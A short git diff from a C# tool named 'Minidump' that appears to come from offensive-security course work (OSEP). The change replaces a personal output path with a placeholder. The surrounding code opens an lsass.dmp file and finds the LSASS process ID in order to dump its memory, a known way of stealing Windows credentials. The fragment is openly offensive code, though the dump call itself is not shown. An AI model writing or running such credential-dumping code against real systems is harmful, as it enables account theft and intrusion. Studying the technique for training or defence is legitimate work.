@@ -22,7 +22,7 @@ namespace Minidump
         static void Main(string[] args)
         {
             Console.WriteLine("[+]File Path Created \r\n");
-            FileStream dumpFile = new FileStream("C:\\Users\\admin\\Documents\\Courses\\OSEP\\Tools\\lsass.dmp", FileMode.Create);
+            FileStream dumpFile = new FileStream("C:\\Enter\\File\\Path\\Here\\lsass.dmp", FileMode.Create);
             Process[] lsass = Process.GetProcessesByName("lsass");
             Console.WriteLine("[+]Lsass.exe process ID found \r\n");
             int lsass_pid = lsass[0].Id;
